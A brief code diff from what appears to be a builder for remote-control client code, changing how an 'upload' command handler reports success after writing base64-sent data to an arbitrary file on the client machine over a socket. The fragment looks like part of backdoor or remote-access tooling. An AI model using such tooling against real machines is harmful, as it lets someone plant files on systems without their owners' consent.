@@ -16,7 +16,7 @@ def upload(data):
     filename = ' '.join(data[1:-1])
     f = open(filename,'wb')
     f.write(b64decode(data[-1]))
-    s.sendall('[+]Successfully wrote uploaded file data'.encode())''')
+    main_send('[+]Successfully wrote uploaded file data', s)''')
         config.logics.append('''
             elif command == "upload":
                 upload(data)''')
